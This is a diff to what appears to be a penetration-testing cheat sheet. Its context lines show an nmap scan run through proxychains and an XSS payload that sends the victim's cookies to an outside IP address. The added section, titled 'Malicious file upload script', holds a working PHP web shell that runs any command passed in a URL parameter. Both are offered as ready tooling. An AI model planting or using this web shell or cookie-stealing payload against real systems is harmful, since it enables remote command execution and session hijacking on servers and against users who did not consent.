@@ -86,6 +86,22 @@ proxychains nmap --script=http-enum.nse 192.168.28.100
 <script>document.location="http://10.50.27.254:8000/"+document.cookie;</script>
 ```
 
+#  Malicious file upload script
+```
+  <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+```
 
 
 
